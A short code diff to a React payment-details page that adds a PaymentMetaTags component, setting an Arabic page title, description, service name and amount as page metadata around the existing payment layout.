@@ -4,6 +4,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -23,6 +24,14 @@ const PaymentDetails = () => {
   };
   
   return (
+    <>
+      <PaymentMetaTags 
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title={`تفاصيل الدفع - ${serviceName}`}
+        description={branding.description || `صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
+      />
     <DynamicPaymentLayout
       serviceName={serviceName}
       serviceKey={serviceKey}
@@ -120,6 +129,7 @@ const PaymentDetails = () => {
         بالمتابعة، أنت توافق على الشروط والأحكام
       </p>
     </DynamicPaymentLayout>
+    </>
   );
 };
 
